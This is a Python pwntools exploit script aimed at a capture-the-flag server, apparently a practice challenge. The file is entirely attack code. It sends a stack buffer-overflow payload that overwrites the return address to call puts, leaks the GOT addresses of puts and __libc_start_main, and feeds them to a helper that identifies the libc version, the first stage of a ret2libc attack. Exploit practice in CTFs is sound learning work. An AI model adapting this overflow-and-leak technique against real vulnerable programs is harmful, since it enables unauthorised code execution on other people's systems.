from pwn import *

import TheNight

import sys

target = remote("ctf.hackucf.org", 9003)
payload = ""
payload += "0000000000000000000000000000000000000000000000000000000000000000"
payload += p32(0xdeadbeef)
payload += "000000000000"
payload += p32(0x80484b0)
payload += p32(0x80484b0)
payload += p32(0x8049a1c)
payload += p32(0x8049a28)
target.sendline(payload)
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
